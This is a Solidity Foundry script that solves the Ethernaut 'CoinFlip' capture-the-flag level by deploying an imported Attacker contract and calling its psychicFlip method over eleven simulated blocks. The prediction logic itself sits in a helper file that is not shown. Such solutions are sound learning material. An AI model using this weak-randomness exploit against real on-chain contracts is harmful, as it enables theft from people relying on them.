// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {CheckScript} from "./common/Check.sol";
import {SolveScript} from "./common/Solve.sol";
import {CoinFlip} from "ethernaut/levels/CoinFlip.sol";
import {Attacker} from "~/helpers/Coinflip.sol";

contract Check is CheckScript("COINFLIP") {}

contract Solve is SolveScript("COINFLIP") {
    CoinFlip target;

    constructor() {
        target = CoinFlip(instance);
    }

    function attack() public override {
        Attacker attacker = new Attacker(address(target));

        // we start the attack at some block
        uint256 startingBlock = block.number;

        for (uint256 i = 0; i <= 10; i++) {
            // we will attack once for each block,
            // so we use `vm.roll` to simulate mining a new block
            // FIXME: how to bypass this?
            vm.roll(startingBlock + i);

            bool result = attacker.psychicFlip();
            require(result, "failed psychic flip");
        }
    }
}
